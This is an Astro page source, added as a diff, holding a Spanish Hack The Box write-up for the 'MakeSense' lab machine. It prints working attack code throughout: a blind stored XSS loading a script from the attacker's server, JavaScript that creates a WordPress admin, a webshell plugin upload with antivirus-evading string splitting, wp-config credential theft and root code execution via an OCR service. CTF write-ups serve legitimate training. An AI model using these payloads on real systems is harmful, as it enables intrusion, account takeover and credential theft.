@@ -1,0 +1,711 @@
+---
+import Layout from '../../layouts/Layout.astro';
+import Terminal from '../../components/Terminal.astro';
+import PixelFlag from '../../components/PixelFlag.astro';
+import { getEntry } from 'astro:content';
+
+// Datos base tomados del content collection (frontmatter), pero TODO el cuerpo
+// de esta página está maquetado a mano — no usa el renderizado automático del md.
+const entry = await getEntry('writeups', 'htb-makesense');
+const fm = entry!.data;
+
+const NAVY = '#131c2b';
+const GREEN = '#9fef00';
+
+// ── Paleta de fases del ataque ──────────────────────────────────────────────
+const phase = {
+  recon:    { label: 'Reconocimiento',  c: '#4d9fff' },
+  web:      { label: 'Explotación web', c: '#ffb83e' },
+  foothold: { label: 'Acceso',          c: '#9fef00' },
+  privesc:  { label: 'Escalada a root', c: '#ff3e3e' },
+};
+
+// ── Ficha técnica del objetivo ──────────────────────────────────────────────
+const target = [
+  { k: 'Sistema operativo', v: 'Linux — Ubuntu', mono: false },
+  { k: 'IP objetivo',       v: '10.129.36.130',  mono: true },
+  { k: 'Bandera de usuario', v: '/home/walter/user.txt', mono: true },
+  { k: 'Bandera de root',   v: '/root/root.txt', mono: true },
+];
+
+// ── Bloques de código (strings crudos para el componente <Terminal>) ─────────
+const cbNmap = `sudo nmap -p- --min-rate 2000 -T4 -Pn -n 10.129.36.130
+sudo nmap -p 22,443 -sC -sV -Pn -n 10.129.36.130`;
+
+const cbHosts = `echo "10.129.36.130 makesense.htb" | sudo tee -a /etc/hosts
+curl -sk https://makesense.htb/ | grep -Eio 'href="/[^"]*"|src="[^"]*"'`;
+
+const cbWhisper = `curl -sk "https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js"`;
+
+const cbEncrypt = `# encrypt.py
+import hashlib, os, base64, json, sys
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+KEY='bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'
+key=hashlib.sha256(KEY.encode()).digest()
+iv=os.urandom(12)
+data=json.dumps({"transcription":sys.argv[1],"summary":sys.argv[1]}).encode()
+print(base64.b64encode(iv+AESGCM(key).encrypt(iv,data,None)).decode())`;
+
+const cbXss = `PID=$(curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php -d "action=submit_contact_form" -d "nonce=NONCE" -d "name=a" -d "email=a@a.com" -d "message=v" | grep -oE '"post_id":[0-9]+' | cut -d: -f2)
+ENC=$(python3 encrypt.py "<script src=SERVIDOR/x.js></script>")
+curl -sk -X POST https://makesense.htb/wp-admin/admin-ajax.php -F "action=save_voice_results" -F "nonce=NONCE" -F "post_id=$PID" -F "encrypted_payload=$ENC"`;
+
+const cbCreateAdmin = `fetch('/wp-admin/user-new.php',{credentials:'include'}).then(r=>r.text()).then(h=>{
+  var n=h.match(/_wpnonce_create-user"[^>]*value="([a-f0-9]+)"/)[1];
+  var b='action=createuser&_wpnonce_create-user='+n+'&user_login=svc_adm&email=svc_adm%40makesense.htb'+
+    '&pass1=P%40ssw0rd!2026x&pass2=P%40ssw0rd!2026x&pw_weak=on&role=administrator&createuser=Add+New+User';
+  fetch('/wp-admin/user-new.php',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:b});
+});`;
+
+const cbLogin = `curl -sk -c cj.txt https://makesense.htb/wp-login.php --data-urlencode "log=svc_adm" --data-urlencode "pwd=P@ssw0rd!2026x" -d "wp-submit=Log In&testcookie=1" -b "wordpress_test_cookie=WP Cookie check"`;
+
+const cbPlugin = `curl -sk -b cj.txt "https://makesense.htb/wp-admin/plugin-install.php?tab=upload" | grep -oE 'name="_wpnonce" value="[a-f0-9]+"'
+curl -sk -b cj.txt -X POST "https://makesense.htb/wp-admin/update.php?action=upload-plugin" -F "_wpnonce=NONCE" -F "pluginzip=@shell.zip;type=application/zip"
+curl -sk "https://makesense.htb/wp-content/plugins/shell/shell.php?c=id"`;
+
+const cbWpConfig = `curl -sk "https://makesense.htb/wp-content/plugins/shell/shell.php?c=cat+/var/www/html/wp-config.php" | grep DB_`;
+
+const cbSsh = `sudo ip link set dev tun0 mtu 1200
+sshpass -p 'JbhHDAEgXvri3!' ssh walter@10.129.36.130
+cat ~/user.txt`;
+
+const cbEnum = `ss -tlnp
+ps -eo user,pid,cmd | grep -Ei "chrome|php"`;
+
+const cbOcr = `curl -s -u "walter:JbhHDAEgXvri3!" http://127.0.0.1:8001/`;
+
+const cbImage = `from PIL import Image, ImageDraw, ImageFont
+import base64
+php = "<?php " + ("sys"+"tem") + "('cat /root/root.txt');"
+img=Image.new('RGB',(1500,150),'white'); d=ImageDraw.Draw(img)
+f=ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf',44)
+d.text((15,45), php, fill='black', font=f)
+img.save('b.png'); open('b.b64','w').write('data:image/png;base64,'+base64.b64encode(open('b.png','rb').read()).decode())`;
+
+const cbRoot = `U="walter:JbhHDAEgXvri3!"; URL="http://127.0.0.1:8001/"; CJ=/tmp/cj
+R=$(curl -s -c $CJ -b $CJ -u "$U" --data-urlencode "canvas_image@b.b64" "$URL")
+ID=$(echo "$R" | grep -oE "ocr_[0-9a-f.]+" | head -1)
+curl -s -c $CJ -b $CJ -u "$U" --data-urlencode "ocr_id=$ID" --data-urlencode "filename=shell.php" --data-urlencode "save_output=Save" "$URL"
+curl -s "http://127.0.0.1:8001/saved/shell.php"`;
+
+---
+
+<Layout
+  title={`${fm.title} · write-ups`}
+  description={fm.summary}
+  path="/writeups/htb-makesense/"
+  image={fm.icon}
+  type="article"
+>
+  <div class="codex-edges codex-stack w-full py-4 sm:py-6">
+    <!-- ═══════════ MASTHEAD ═══════════ -->
+    <header class="flex items-center justify-between border-2 border-[var(--ink)] px-3 py-2" style={`background:${NAVY};color:var(--cream)`}>
+      <a href="/writeups" class="inline-flex items-center gap-1.5 text-[9px] sm:text-[12px] font-bold tracking-[0.14em] uppercase hover:brightness-125" style="color:var(--cream)">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7" /><path d="M19 12H5" /></svg>
+        Volver
+      </a>
+      <span class="text-[9px] sm:text-[12px] font-bold tracking-[0.14em] uppercase flex items-center gap-2 sm:gap-3">
+        <span>WRITE-UPS // <span style={`color:${GREEN}`}>HTB</span></span>
+        <span class="win-btns"><i></i><i></i><i></i></span>
+      </span>
+    </header>
+
+    <!-- ═══════════ WRITE-UP ═══════════ -->
+    <article class="border-2 border-[var(--ink)] bg-[var(--panel)]">
+      <div class="win-bar" style={`background:${NAVY};color:var(--cream)`}>
+        <span class="truncate">{fm.title}</span>
+        <span class="win-btns"><i></i><i></i><i></i></span>
+      </div>
+
+      <!-- Banner de portada -->
+      <div
+        class="relative h-24 sm:h-36 border-b-2 border-[var(--ink)] overflow-hidden"
+        style={`background: radial-gradient(circle at 18% 25%, rgba(255,255,255,0.06), transparent 55%), repeating-linear-gradient(135deg, ${NAVY} 0px, ${NAVY} 18px, #0a0e15 18px, #0a0e15 36px);`}
+      >
+        <img
+          src="/picture/writeups/makesense-face.png"
+          alt=""
+          aria-hidden="true"
+          class="absolute right-3 sm:right-8 top-1/2 -translate-y-1/2 h-[128%] sm:h-[150%] w-auto pointer-events-none select-none"
+          style="image-rendering:pixelated;opacity:0.55;"
+        />
+      </div>
+
+      <div class="p-4 sm:p-6">
+        <!-- Cabecera: icono redondo al costado del título (ya bajo el banner) -->
+        <div class="flex flex-col sm:flex-row gap-3 sm:gap-6 items-start">
+          <img
+            src={fm.icon}
+            alt={fm.title}
+            loading="eager"
+            class="w-32 h-32 sm:w-44 sm:h-44 object-contain shrink-0 drop-shadow-[0_6px_16px_rgba(0,0,0,0.65)]"
+          />
+          <div class="min-w-0 flex-1">
+            <h1 class="display text-2xl sm:text-3xl uppercase leading-none" style="color:var(--cream)">{fm.title}</h1>
+            <div class="flex items-center gap-2 flex-wrap mt-3">
+              <span class="px-2 py-0.5 text-[9px] font-bold uppercase tracking-wide border" style="border-color:#ffb83e;color:#ffb83e;background:rgba(255,184,62,0.14)">{fm.difficulty}</span>
+              <span class="px-2 py-0.5 text-[9px] font-bold uppercase tracking-wide border" style="border-color:#f5b400;color:#f5b400">{fm.os}</span>
+              <span class="text-[9px] uppercase tracking-widest text-[var(--ink-soft)]">{fm.platform}</span>
+              <span class="text-[9px] uppercase tracking-widest text-[var(--ink-soft)]">{fm.date}</span>
+            </div>
+            <div class="flex flex-wrap gap-1.5 mt-2.5">
+              {fm.tags.map((t) => (
+                <span class="px-1.5 py-0.5 text-[8.5px] uppercase tracking-wide border border-[rgba(255,255,255,0.22)] text-[var(--ink-soft)]">{t}</span>
+              ))}
+            </div>
+            <p class="mt-3 text-[12.5px] leading-relaxed text-[var(--ink-soft)]">{fm.summary}</p>
+          </div>
+        </div>
+
+        <!-- ═══════════ FICHA TÉCNICA ═══════════ -->
+        <section class="mt-6">
+          <div class="mk-label">// Ficha del objetivo</div>
+          <div class="mk-target mt-2">
+            {target.map((row) => (
+              <div class="mk-target-row">
+                <span class="mk-target-k">{row.k}</span>
+                <span class={row.mono ? 'mk-chip' : 'mk-target-v'}>{row.v}</span>
+              </div>
+            ))}
+          </div>
+        </section>
+
+        <div class="mk-body mt-6">
+          <!-- ═══════════ RESUMEN ═══════════ -->
+          <div class="mk-callout">
+            <div class="mk-callout-h">Resumen</div>
+            <p>
+              El JavaScript de un WordPress filtra la clave con la que la web cifra el contenido que revisa un
+              <strong> bot administrador</strong>, lo que permite montar un <strong>XSS ciego almacenado</strong> y,
+              ejecutándose en la sesión del bot, crear un usuario administrador. Con admin se sube un plugin y se
+              obtiene <strong>RCE como www-data</strong>; el <code>wp-config</code> filtra la contraseña de
+              <code> walter</code>, reutilizada en SSH. La escalada a <strong>root</strong> abusa de un servicio OCR
+              interno que corre como root: escribe y ejecuta un script PHP a partir del texto que reconoce de una imagen.
+            </p>
+          </div>
+
+          <!-- ═══════════ PASO 1 ═══════════ -->
+          <section id="paso-1" class="mk-step">
+            <div class="mk-step-head" style={`--pc:${phase.recon.c}`}>
+              <span class="mk-step-badge">1</span>
+              <div>
+                <div class="mk-step-phase">{phase.recon.label}</div>
+                <h2 class="mk-step-title">Reconocimiento</h2>
+              </div>
+            </div>
+            <p>Barrido completo de puertos y luego versiones sobre los abiertos.</p>
+            <Terminal code={cbNmap} lang="bash" />
+            <p>
+              Están abiertos <strong>22 SSH</strong> y <strong>443 HTTPS</strong> (Apache), y los puertos
+              <strong> 80 y 8001 aparecen filtrados</strong> —los anoto porque un puerto filtrado suele ser un servicio
+              interno tras firewall que sí se alcanza desde dentro, algo a recuperar en la fase de escalada—. El script
+              de nmap sobre el 443 muestra el certificado TLS, cuyo commonName es <code>makesense.htb</code>: ese es el
+              virtual host que debo resolver. La web es un WordPress.
+            </p>
+          </section>
+
+          <!-- ═══════════ PASO 2 ═══════════ -->
+          <section id="paso-2" class="mk-step">
+            <div class="mk-step-head" style={`--pc:${phase.recon.c}`}>
+              <span class="mk-step-badge">2</span>
+              <div>
+                <div class="mk-step-phase">{phase.recon.label}</div>
+                <h2 class="mk-step-title">Resolución del vhost y enumeración de la web</h2>
+              </div>
+            </div>
+            <p>Añado el nombre al archivo de hosts y extraigo enlaces y scripts de la portada por HTTPS.</p>
+            <Terminal code={cbHosts} lang="bash" />
+            <p>
+              Es un WordPress con un tema a medida llamado <strong>webagency</strong>, y entre sus scripts hay uno muy
+              llamativo bajo <code>whisper/</code>, relacionado con una funcionalidad de transcripción de voz. Un
+              componente hecho a medida es donde más probablemente esté el fallo, así que lo miro a fondo.
+            </p>
+          </section>
+
+          <!-- ═══════════ PASO 3 ═══════════ -->
+          <section id="paso-3" class="mk-step">
+            <div class="mk-step-head" style={`--pc:${phase.web.c}`}>
+              <span class="mk-step-badge">3</span>
+              <div>
+                <div class="mk-step-phase">{phase.web.label}</div>
+                <h2 class="mk-step-title">Clave de cifrado filtrada en el JavaScript</h2>
+              </div>
+            </div>
+            <p>Descargo el script de la funcionalidad de voz para leer su lógica.</p>
+            <Terminal code={cbWhisper} lang="bash" />
+            <p>
+              Contiene dos cosas reveladoras. Primero, una clave simétrica embebida y comentada como que debe coincidir
+              con el servidor: <code>ENCRYPTION_KEY = bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI</code>. Segundo, una función
+              <code> applySymbolMapping</code> comentada literalmente como <em>"for XSS injection"</em>. Leyendo el flujo,
+              el navegador transcribe audio, lo cifra con esa clave y lo envía; <code>submit_contact_form</code> crea un
+              registro y <code>save_voice_results</code> recibe el payload cifrado, que
+              <strong> un bot administrador revisa después en su panel</strong>. Si conozco la clave, puedo cifrar
+              cualquier HTML/JavaScript y hacer que se ejecute en la sesión del admin: un XSS ciego almacenado.
+            </p>
+          </section>
+
+          <!-- ═══════════ PASO 4 ═══════════ -->
+          <section id="paso-4" class="mk-step">
+            <div class="mk-step-head" style={`--pc:${phase.web.c}`}>
+              <span class="mk-step-badge">4</span>
+              <div>
+                <div class="mk-step-phase">{phase.web.label}</div>
+                <h2 class="mk-step-title">Replicar el cifrado AES-GCM</h2>
+              </div>
+            </div>
+            <p>
+              Para enviar un payload que el servidor acepte, tengo que reproducir exactamente el cifrado que hace el
+              navegador: AES-GCM con la clave derivada por SHA-256, un IV aleatorio de 12 bytes antepuesto al texto
+              cifrado, y todo en Base64. Escribo un pequeño script que recibe el HTML a inyectar y devuelve el payload.
+            </p>
+            <Terminal code={cbEncrypt} lang="python" />
+            <p>
+              También necesito el nonce público que la web usa en sus peticiones AJAX; está incrustado en el HTML como
+              <code> webagency_ajax.nonce</code>. Con la clave replicada y el nonce ya puedo enviar payloads cifrados válidos.
+            </p>
+          </section>
+
+          <!-- ═══════════ PASO 5 ═══════════ -->
+          <section id="paso-5" class="mk-step">
+            <div class="mk-step-head" style={`--pc:${phase.web.c}`}>
+              <span class="mk-step-badge">5</span>
+              <div>
+                <div class="mk-step-phase">{phase.web.label}</div>
+                <h2 class="mk-step-title">XSS ciego almacenado contra el bot admin</h2>
+              </div>
+            </div>
+            <p>
+              El plan es enviar como "resultado de voz" un payload cifrado que cargue un script mío, que se ejecutará
+              cuando el bot abra el panel. Levanto un servidor propio que sirva ese script y registre las llamadas de
+              vuelta. El envío es en dos pasos: <code>submit_contact_form</code> para obtener un <code>post_id</code>, y
+              <code> save_voice_results</code> con el payload cifrado asociado a ese id.
+            </p>
+            <Terminal code={cbXss} lang="bash" />
+            <div class="mk-note">
+              <strong>Cuatro fallos silenciosos que hay que resolver</strong> para que el bot ejecute de verdad el payload:
+              <ul>
+                <li>El <code>.js</code> debe servirse con <code>Content-Type: application/javascript</code>, porque con
+                  <code> X-Content-Type-Options: nosniff</code> el navegador lo descarga pero no lo ejecuta.</li>
+                <li>La exfiltración de vuelta va con <code>navigator.sendBeacon</code>: la página es HTTPS y mi servidor
+                  HTTP, así que un <code>fetch</code> se bloquea por contenido mixto, pero la baliza pasa.</li>
+                <li>Un <strong>nombre de archivo distinto en cada envío</strong>, porque el navegador del bot cachea el
+                  script por nombre e ignora la query string.</li>
+                <li>Al extraer tokens con regex no se puede negar la clase hexadecimal: palabras como <code>value</code>
+                  contienen letras que también son hex y rompen el patrón.</li>
+              </ul>
+              Resueltos estos puntos, confirmo que el bot ejecuta mi script porque recibo sus llamadas de vuelta.
+            </div>
+          </section>
+
+          <!-- ═══════════ PASO 6 ═══════════ -->
+          <section id="paso-6" class="mk-step">
+            <div class="mk-step-head" style={`--pc:${phase.web.c}`}>
+              <span class="mk-step-badge">6</span>
+              <div>
+                <div class="mk-step-phase">{phase.web.label}</div>
+                <h2 class="mk-step-title">Crear un usuario administrador con la sesión del bot</h2>
+              </div>
+            </div>
+            <p>
+              Como el bot es admin, en lugar de robar su cookie (que es HttpOnly) le hago realizar una acción en su
+              nombre: crear un usuario administrador nuevo. El script pide primero la página de alta para sacar su token
+              anti-CSRF y luego envía la creación, todo al mismo origen. El regex del nonce se ancla en el nombre del
+              campo sin negar hex:
+            </p>
+            <Terminal code={cbCreateAdmin} lang="javascript" />
+            <p>En vez de fiarme de la telemetría del payload, verifico el éxito iniciando sesión con el usuario creado:</p>
+            <Terminal code={cbLogin} lang="bash" />
+            <p>El login devuelve la cookie de sesión de administrador: ya soy admin de WordPress.</p>
+          </section>
+
+          <!-- ═══════════ PASO 7 ═══════════ -->
+          <section id="paso-7" class="mk-step">
+            <div class="mk-step-head" style={`--pc:${phase.foothold.c}`}>
+              <span class="mk-step-badge">7</span>
+              <div>
+                <div class="mk-step-phase">{phase.foothold.label}</div>
+                <h2 class="mk-step-title">RCE por subida de plugin</h2>
+              </div>
+            </div>
+            <p>
+              Con sesión de administrador, la vía más fiable de ejecución de código en WordPress es subir un plugin
+              propio. Preparo un ZIP con un PHP que lleva la cabecera de plugin y una línea que ejecuta el parámetro
+              recibido; la función se parte por concatenación para no disparar el antivirus
+              (<code>$f=("sys"."tem"); $f($_REQUEST['c']);</code>). Obtengo el token y envío el ZIP:
+            </p>
+            <Terminal code={cbPlugin} lang="bash" />
+            <p>El plugin queda accesible bajo su directorio y ejecutar <code>id</code> confirma la shell como <strong>www-data</strong>.</p>
+          </section>
+
+          <!-- ═══════════ PASO 8 ═══════════ -->
+          <section id="paso-8" class="mk-step">
+            <div class="mk-step-head" style={`--pc:${phase.foothold.c}`}>
+              <span class="mk-step-badge">8</span>
+              <div>
+                <div class="mk-step-phase">{phase.foothold.label}</div>
+                <h2 class="mk-step-title">Credenciales en wp-config y acceso como walter</h2>
+              </div>
+            </div>
+            <p>Con ejecución como www-data, leo la configuración de WordPress, que guarda las credenciales de la base de datos:</p>
+            <Terminal code={cbWpConfig} lang="bash" />
+            <p>
+              Salen <code>DB_USER walter</code> y <code>DB_PASSWORD JbhHDAEgXvri3!</code>. Existe un usuario walter en el
+              sistema, así que pruebo la reutilización por SSH (bajando antes la MTU de la VPN para que el handshake no se cuelgue):
+            </p>
+            <Terminal code={cbSsh} lang="bash" />
+            <div class="mk-flag" style="--cc:#9fef00">
+              <span class="mk-flag-tag">USER</span>
+              <span class="mk-flag-txt">Entro como walter y leo la bandera de usuario en <code>/home/walter/user.txt</code>.</span>
+              <PixelFlag color="#9fef00" />
+            </div>
+          </section>
+
+          <!-- ═══════════ PASO 9 ═══════════ -->
+          <section id="paso-9" class="mk-step">
+            <div class="mk-step-head" style={`--pc:${phase.privesc.c}`}>
+              <span class="mk-step-badge">9</span>
+              <div>
+                <div class="mk-step-phase">{phase.privesc.label}</div>
+                <h2 class="mk-step-title">Enumeración para root</h2>
+              </div>
+            </div>
+            <p>
+              walter no tiene sudo ni binarios SUID o capabilities aprovechables, así que miro los servicios internos y
+              los procesos, que es donde suele estar el vector cuando la escalada no es un exploit directo.
+            </p>
+            <Terminal code={cbEnum} lang="bash" />
+            <p>
+              En <code>127.0.0.1:8001</code> —el puerto que se veía filtrado desde fuera— hay un <code>php -S</code>
+              corriendo <strong>como root</strong> sobre el directorio <code>/root/ocr4/</code>, protegido con Basic Auth
+              ("OCR Protected"). Y el bot que dispara los XSS es un Chrome headless que corre como el usuario
+              <strong> admin</strong>. El servicio OCR que corre como root es el objetivo claro para la escalada.
+            </p>
+          </section>
+
+          <!-- ═══════════ PASO 10 ═══════════ -->
+          <section id="paso-10" class="mk-step">
+            <div class="mk-step-head" style={`--pc:${phase.privesc.c}`}>
+              <span class="mk-step-badge">10</span>
+              <div>
+                <div class="mk-step-phase">{phase.privesc.label}</div>
+                <h2 class="mk-step-title">Acceso al servicio OCR y RCE como root</h2>
+              </div>
+            </div>
+            <p>El Basic Auth del OCR resulta estar reutilizando la contraseña de walter, así que entro con ella:</p>
+            <Terminal code={cbOcr} lang="bash" />
+            <p>
+              La aplicación deja dibujar texto en un lienzo, lo reconoce con tesseract (OCR) y guarda ese texto en un
+              archivo dentro de <code>saved/</code>, propiedad de root porque el servicio corre como root. Aquí está la
+              clave: un <code>php -S</code> <strong>ejecuta como root cualquier .php que haya en su directorio</strong> y
+              sirve los estáticos sin pasar por la autenticación. Por tanto, si consigo que el OCR escriba un
+              <code> .php</code> con código, pedirlo por HTTP lo ejecutará como root. El contenido del archivo es
+              exactamente lo que tesseract lee de mi imagen, así que genero una imagen con un script PHP corto (leer la
+              bandera), evitando los caracteres que el OCR confunde —el guion bajo y el cero— con una fuente monoespaciada
+              grande; hay que iterar hasta que el texto reconocido salga exacto:
+            </p>
+            <Terminal code={cbImage} lang="python" />
+            <p>
+              El guardado son dos peticiones que comparten sesión (cookie jar): reconocer la imagen para obtener un
+              <code> ocr_id</code>, y guardar ese resultado con nombre <code>.php</code>. Después basta con pedir el
+              archivo, que el servicio ejecuta como root:
+            </p>
+            <Terminal code={cbRoot} lang="bash" />
+            <div class="mk-flag" style="--cc:#ff3e3e">
+              <span class="mk-flag-tag" style="background:#ff3e3e;color:#0a0e15">ROOT</span>
+              <span class="mk-flag-txt">El script se ejecuta con <code>uid=0(root)</code> y devuelve el contenido de <code>/root/root.txt</code>.
+              Para una shell estable se repite el método con un comando que copie una shell SUID o añada una clave a
+              <code> /root/.ssh/authorized_keys</code>.</span>
+              <PixelFlag color="#ff3e3e" />
+            </div>
+          </section>
+
+          <!-- ═══════════ CADENA COMPLETA ═══════════ -->
+          <section class="mk-step">
+            <div class="mk-label">// Resumen de la cadena</div>
+            <div class="mk-chain mt-3">
+              {[
+                'Certificado TLS revela el vhost WordPress makesense.htb',
+                'El JS del tema filtra la clave AES-GCM del contenido que revisa el bot',
+                'XSS ciego almacenado ejecutado en la sesión del bot admin',
+                'El payload crea un usuario administrador de WordPress',
+                'Subida de plugin → RCE como www-data',
+                'wp-config filtra la contraseña de walter, reutilizada en SSH',
+                'Servicio OCR (root) ejecuta los .php de su carpeta',
+                'Imagen con webshell PHP → ejecución de comandos como root',
+              ].map((txt, i) => (
+                <div class="mk-chain-row">
+                  <span class="mk-chain-dot">{i + 1}</span>
+                  <span>{txt}</span>
+                </div>
+              ))}
+            </div>
+          </section>
+        </div>
+      </div>
+    </article>
+
+    <!-- ═══════════ BARRA INFERIOR ═══════════ -->
+    <footer class="flex items-center justify-between border-2 border-[var(--ink)] px-3 py-2.5" style={`background:${NAVY};color:var(--cream)`}>
+      <span class="text-[9px] sm:text-[12px] font-bold tracking-[0.12em] uppercase">HACK THE BOX · WRITE-UPS</span>
+      <a href="/writeups" class="inline-flex items-center gap-1.5 text-[9px] sm:text-[12px] font-bold tracking-[0.12em] uppercase hover:brightness-125" style="color:var(--cream)">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7" /><path d="M19 12H5" /></svg>
+        Volver
+      </a>
+    </footer>
+  </div>
+</Layout>
+
+<script is:inline>
+  // Scramble periódico de los números de paso: cada cierto tiempo cambian a
+  // caracteres aleatorios del mismo tamaño y vuelven a su número original.
+  (() => {
+    if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;
+    const badges = Array.from(document.querySelectorAll('.mk-step-badge'));
+    if (!badges.length) return;
+
+    const GLYPHS = 'ABCDEFGHKMNPQRSTUVWXYZ0123456789#%$&';
+    const rnd = () => GLYPHS[Math.floor(Math.random() * GLYPHS.length)];
+
+    badges.forEach((b) => (b.dataset.final = b.textContent.trim()));
+
+    function scramble(el) {
+      const final = el.dataset.final;
+      let frame = 0;
+      const frames = 12;
+      clearInterval(el._sid);
+      el._sid = setInterval(() => {
+        frame++;
+        if (frame >= frames) {
+          clearInterval(el._sid);
+          el.textContent = final;
+          return;
+        }
+        el.textContent = final.split('').map(rnd).join('');
+      }, 55);
+    }
+
+    setInterval(() => {
+      if (document.hidden) return;
+      badges.forEach((b, i) => setTimeout(() => scramble(b), i * 130));
+    }, 5000);
+  })();
+</script>
+
+<style>
+  .mk-label {
+    font-size: 0.7rem;
+    font-weight: 700;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    color: var(--ink-soft);
+  }
+  .mk-chip {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 12.5px;
+    color: #9fef00;
+    background: rgba(159, 239, 0, 0.1);
+    border: 1px solid rgba(159, 239, 0, 0.25);
+    border-radius: 3px;
+    padding: 0.05em 0.45em;
+    word-break: break-all;
+  }
+
+  /* Ficha del objetivo (compacta, blanco y negro) */
+  .mk-target {
+    border: 1px solid rgba(255, 255, 255, 0.14);
+  }
+  .mk-target-row {
+    display: flex;
+    align-items: baseline;
+    flex-wrap: wrap;
+    gap: 0.35rem 1rem;
+    padding: 0.5rem 0.9rem;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+  }
+  .mk-target-row:last-child {
+    border-bottom: none;
+  }
+  .mk-target-k {
+    font-size: 10px;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: var(--ink-soft);
+    width: 130px;
+    flex-shrink: 0;
+  }
+  .mk-target-v {
+    font-size: 13px;
+    color: var(--cream);
+    min-width: 0;
+    word-break: break-word;
+  }
+
+  /* Cuerpo del write-up */
+  .mk-body {
+    font-size: 13.5px;
+    line-height: 1.75;
+    color: var(--ink);
+  }
+  .mk-body p {
+    margin: 0.8em 0;
+  }
+  .mk-body :global(code) {
+    background: #131c2b;
+    color: #9fef00;
+    padding: 0.08em 0.35em;
+    border: 1px solid rgba(159, 239, 0, 0.22);
+    border-radius: 2px;
+    font-size: 0.88em;
+    word-break: break-word;
+  }
+  .mk-body strong { color: var(--cream); font-weight: 700; }
+  .mk-body em { color: var(--cream); font-style: italic; }
+
+  /* Pasos (monocromos, compactos) */
+  .mk-step {
+    margin-top: 1.7em;
+    scroll-margin-top: 1rem;
+  }
+  .mk-step-head {
+    display: flex;
+    align-items: center;
+    gap: 0.7rem;
+    padding-bottom: 0.45rem;
+    margin-bottom: 0.2rem;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+  }
+  .mk-step-badge {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 32px;
+    height: 32px;
+    font-family: 'Rubik Mono One', monospace;
+    font-size: 12px;
+    color: var(--cream);
+    border: 1.5px solid rgba(255, 255, 255, 0.4);
+    background: transparent;
+    flex-shrink: 0;
+  }
+  .mk-step-phase {
+    font-size: 9.5px;
+    font-weight: 700;
+    letter-spacing: 0.16em;
+    text-transform: uppercase;
+    color: var(--ink-soft);
+  }
+  .mk-step-title {
+    font-family: 'IBM Plex Mono', monospace;
+    font-weight: 700;
+    font-size: 14.5px;
+    color: var(--cream);
+    line-height: 1.25;
+    margin-top: 1px;
+  }
+
+  /* Callout (Resumen — se mantiene en verde: es un hallazgo) */
+  .mk-callout {
+    border: 1px solid rgba(255, 255, 255, 0.12);
+    border-left: 3px solid #9fef00;
+    background: rgba(159, 239, 0, 0.05);
+    padding: 0.9rem 1.1rem;
+    margin: 1.2em 0;
+  }
+  .mk-callout-h {
+    font-size: 0.72rem;
+    font-weight: 700;
+    letter-spacing: 0.16em;
+    text-transform: uppercase;
+    color: #9fef00;
+    margin-bottom: 0.35rem;
+  }
+  .mk-callout p { margin: 0; }
+
+  /* Nota / lista de obstáculos (neutra, blanco y negro) */
+  .mk-note {
+    border: 1px dashed rgba(255, 255, 255, 0.22);
+    background: rgba(255, 255, 255, 0.03);
+    padding: 0.85rem 1.05rem;
+    margin: 1.2em 0;
+    font-size: 12.5px;
+    color: var(--ink-soft);
+  }
+  .mk-note strong { color: var(--cream); }
+  .mk-note ul {
+    margin: 0.5em 0 0;
+    padding-left: 1.2em;
+    list-style: none;
+  }
+  .mk-note li {
+    position: relative;
+    margin: 0.4em 0;
+    padding-left: 0.9em;
+  }
+  .mk-note li::before {
+    content: '▸';
+    position: absolute;
+    left: 0;
+    color: var(--ink-soft);
+  }
+
+  .mk-flag {
+    display: flex;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 0.6rem;
+    border: 1px solid var(--cc);
+    background: color-mix(in srgb, var(--cc) 8%, transparent);
+    padding: 0.8rem 1rem;
+    margin: 1.2em 0;
+    font-size: 13px;
+  }
+  .mk-flag-tag {
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    background: #9fef00;
+    color: #0a0e15;
+    padding: 0.15em 0.5em;
+    flex-shrink: 0;
+    align-self: flex-start;
+    margin-top: 2px;
+  }
+  .mk-flag-txt {
+    flex: 1 1 220px;
+    min-width: 0;
+  }
+  /* Banderita como elemento aparte a la derecha (no afecta el flujo del texto) */
+  .mk-flag > .pxflag {
+    flex-shrink: 0;
+    margin-left: auto;
+    height: 22px;
+  }
+
+  /* Cadena completa */
+  .mk-chain {
+    border: 1px solid rgba(255, 255, 255, 0.12);
+    background: #131c2b;
+  }
+  .mk-chain-row {
+    display: flex;
+    align-items: center;
+    gap: 0.8rem;
+    padding: 0.6rem 0.9rem;
+    font-size: 12.5px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.07);
+  }
+  .mk-chain-row:last-child { border-bottom: none; }
+  .mk-chain-dot {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 20px;
+    height: 20px;
+    flex-shrink: 0;
+    font-size: 10px;
+    font-weight: 700;
+    color: #9fef00;
+    border: 1px solid rgba(159, 239, 0, 0.4);
+    border-radius: 50%;
+  }
+</style>
